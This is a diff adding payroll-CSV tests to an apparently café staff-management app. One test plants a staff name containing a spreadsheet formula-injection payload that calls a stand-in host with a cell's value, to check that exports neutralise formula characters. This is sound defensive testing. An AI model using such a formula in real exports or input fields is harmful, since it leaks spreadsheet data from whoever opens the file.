@@ -806,3 +806,36 @@ test('rota: owner plans shifts, staff can read, overlaps refused', async () => {
 test('the rota is seeded for the next two weeks', () => {
   assert.ok(db.prepare('SELECT COUNT(*) n FROM planned_shifts WHERE start >= ?').get(new Date().toISOString()).n >= 10);
 });
+
+// --- payroll CSV hardening --------------------------------------------------------------
+
+async function payrollCsv(admin) {
+  const month = new Date().toISOString().slice(0, 7);
+  const res = await fetch(`${base}/api/admin/payroll.csv?month=${month}`, { headers: { cookie: await cookieOf(admin) } });
+  return (await res.text()).replace(/^\uFEFF/, '').trim().split('\r\n');
+}
+function staffWithShift(name, email, wage) {
+  const id = db.prepare(`INSERT INTO users (member_id, name, email, password_hash, role, hourly_wage) VALUES (?, ?, ?, 'x:x', 'staff', ?)`)
+    .run(`SASU-${8000 + Math.floor(Math.random() * 999)}`, name, email, wage).lastInsertRowid;
+  const start = new Date(Date.now() - 864e5); start.setUTCHours(8, 0, 0, 0);
+  db.prepare('INSERT INTO shifts (user_id, clock_in, clock_out) VALUES (?, ?, ?)').run(id, start.toISOString(), new Date(start.getTime() + 4 * 3600e3).toISOString());
+  return id;
+}
+
+test('payroll CSV neutralises spreadsheet formulas in names', async () => {
+  const admin = await login('SASU-1000', 'admin123');
+  staffWithShift('=HYPERLINK("http://x/?"&C2;"Lohn")', 'formel@cafe-elsasu.de', 1200);
+  staffWithShift('+49 Plus', 'plus@cafe-elsasu.de', 1200);
+  const cells = (await payrollCsv(admin)).flatMap((l) => l.match(/("([^"]|"")*"|[^;]*)(;|$)/g).map((c) => c.replace(/;$/, '').replace(/^"|"$/g, '')));
+  assert.ok(cells.some((c) => c.includes('HYPERLINK')), 'the row is there');
+  for (const c of cells) assert.ok(!/^[=+\-@]/.test(c), `cell starts with a formula character: ${c}`);
+});
+
+test('payroll CSV keeps two people with the same name apart', async () => {
+  const admin = await login('SASU-1000', 'admin123');
+  staffWithShift('Doppel Name', 'doppel1@cafe-elsasu.de', 1000);
+  staffWithShift('Doppel Name', 'doppel2@cafe-elsasu.de', 2000);
+  const sums = (await payrollCsv(admin)).filter((l) => l.startsWith('Summe Doppel Name;'));
+  assert.equal(sums.length, 2);
+  assert.deepEqual(sums.map((l) => l.split(';')[8]).sort(), ['40,00', '80,00']);
+});
